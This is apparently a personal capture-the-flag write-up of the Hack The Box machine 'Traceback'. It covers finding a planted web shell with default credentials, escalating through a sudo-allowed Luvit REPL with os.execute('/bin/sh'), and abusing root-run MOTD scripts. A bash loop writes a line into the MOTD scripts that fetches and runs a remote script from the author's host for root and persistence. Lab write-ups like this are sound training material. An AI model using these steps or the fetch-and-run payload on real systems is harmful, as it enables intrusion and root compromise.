# Traceback (10.10.10.181) 

## Recon

### 80/TCP HTTP

Landing page source code contains "Some of the best web shells that you might need" reference. Creating a wordlist of shells from https://github.com/TheBinitGhimire/Web-Shells and using dirb

Found http://traceback.htb/smevk.php

Default credentials are admin:admin, https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php

## Initial Access

Gained access to the web shell via admin:admin at Wed 18 Mar 2020 06:57:24 AM UTC

Uploaded and executed a php shell at Wed 18 Mar 2020 07:24:45 AM UTC

## Privilege Escalation

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit

https://github.com/luvit/luvit
	
	uv.setuid(id)
	uv.setgid(id)

Can run Lua code

`os.execute("/bin/sh")`

The box is inaccessible (for the last 15-30 minutes), stopping for the night at Wed 18 Mar 2020 08:16:43 AM UTC 
coming back to this at Thu 19 Mar 2020 04:25:01 AM UTC

Got sysadmin at Thu 19 Mar 2020 04:39:49 AM UTC
```
webadmin@traceback:/dev/shm$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> os.execute("/bin/sh")
$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
```

`-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping`

Ping has SUID? Tried command injection, could not get it to work.

OpenSSH_7.6p1 Ubuntu-4ubuntu0.3, OpenSSL 1.0.2n  7 Dec 2017
	no immediate vulnerabilities

After some additional recon, I realized the SUID on ping is not out of the ordinary

Looking over privesc script outputs some more

Both .luvit_history are global read
Sudo is outdated, trying exploits/linux/local/25134.c
	gcc is not installed

After Google traceback to get an idea of what it means, I come across error traceacks in python. I remember seeing a stray python file somewhere on this file system. Investigating.
	privesc/linenum-sysadmin.report:-rw-rw-rw- 1 webadmin webadmin 35 Mar 18 21:32 /tmp/asdf.py - no longer there
	/etc/python3.6/sitecustomize.py - maybe?
```
sysadmin@traceback:~$ find / $(pwd) -type f -name "*.py*" -newermt 2019-03-01 ! -newermt 2019-04-01 2> /dev/null
/usr/lib/python3/dist-packages/ufw/common.py
/usr/lib/python3/dist-packages/distro_info.py
/usr/share/apport/package-hooks/openssh-client.py
/usr/share/apport/package-hooks/source_grub2.py
/usr/share/apport/package-hooks/source_shadow.py
/usr/share/apport/package-hooks/openssh-server.py
```

Apport does not seem to be installed

```
sysadmin@traceback:~$ find /usr/lib/python* | grep apport 2> /dev/null
sysadmin@traceback:~$
```

/home/sysadmin/pspy64
	https://pypi.org/project/fs-watcher/
```
^CExiting program... (interrupt)
sysadmin@traceback:~$ ./pspy64
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100msand on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
```
Owned by root
	
It looks like I can edit the MOTD in /etc/update-motd.d/ and have it execute as root if someone log's into the box but I am having touble getting it to work. Will come back to it later.

After looking over my notes, I realized gcc is installed but the path in the exploit has to be modified. I have done so. Trying that exploit. Nevermind, it has something to do with python.

## Privelege Escalation & Persistence

Trying to exploit MOTD banner, creating payload that I can just run and wait

```
#!/bin/bash
while true
do
	for i in $(ls /etc/update-motd.d/)
	do
		cd /etc/update-motd.d/
		echo "wget  http://10.10.15.6:8000/linper.sh && bash linper.sh" >> $i
    done
done
```

Got root!

This seems to have been the user that logged in via SSH and triggred the exploit, interesting because it is not one needed to compromise (automated logins?). Could be unrelated.

```
root@traceback:~# w
w
 22:04:29 up 21 min,  1 user,  load average: 83.12, 24.41, 8.65
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
webadmin pts/2    10.10.14.34      21:56   10.00s  0.07s  0.01s sshd: webadmin [priv]
```